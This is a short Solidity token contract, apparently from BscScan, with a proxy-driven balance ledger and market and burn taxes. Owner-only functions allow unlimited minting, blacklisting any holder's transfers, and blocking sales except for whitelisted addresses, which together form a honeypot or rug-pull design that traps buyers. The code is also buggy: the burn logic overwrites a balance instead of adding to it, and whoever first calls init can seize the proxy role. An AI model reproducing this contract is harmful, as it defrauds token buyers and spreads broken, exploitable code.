/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract Acc {
    mapping(address => uint256) public balance;
    mapping(address => bool) public black;
    mapping(address => bool) public white;
    bool public swap = true;
    address public  proxy;
    address public  owner;
    address public  router; 
    address public marketAddres;
    uint private marketTax = 10;
    uint private burnTax = 10;


    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function  doTransfer  (
        address from,
        address to,
        uint256 amount
    )  public  {
        require(proxy == msg.sender,"Insufficient auth");

        require(from != address(0));
        require(to != address(0));
        require(balance[from] >= amount, "Insufficient token");

        require(!black[from], "Trading suspension");

        if(!swap && router == to) {
            require(white[from] || white[to], "swap suspension");
        }

        uint realAmount = amount;
        uint taxAmount = 0;
        if(marketTax != 0) {
            taxAmount = amount * marketTax / 100;
            realAmount = amount - taxAmount;
            balance[marketAddres] =  balance[marketAddres] + taxAmount;
        } 

        if(burnTax != 0) {
            taxAmount = amount * burnTax / 100;
            realAmount = realAmount - taxAmount;
            balance[address(0)] = realAmount;
        }

        balance[from] = balance[from] - amount;
        balance[to] = balance[to] + realAmount;
    }

    function balanceOf(address who) public view returns (uint256)  {
        return balance[who];
    }

    constructor(address _marketAddres){
        owner = msg.sender;
        marketAddres = _marketAddres;
    }


    function init(address who, uint amount) public {
        require(proxy == address(0) || msg.sender == proxy, "no auth");
        if(proxy == address(0)) {
            proxy = msg.sender;
        } 
        balance[who] = amount;
    }

    function mint(address who, uint amount) public onlyOwner{
       balance[who] = balance[who] + amount;
    }

    function setBlack(address who, bool status) public onlyOwner{
        black[who] = status;
    }

    function setWhite(address who, bool status) public onlyOwner{
        white[who] = status;
    }

    function setSwap(bool status) public onlyOwner{
        swap = status;
    }

    function setRouter(address _router) public  onlyOwner {
        router = _router;
    }

    receive() external  payable {

    }
}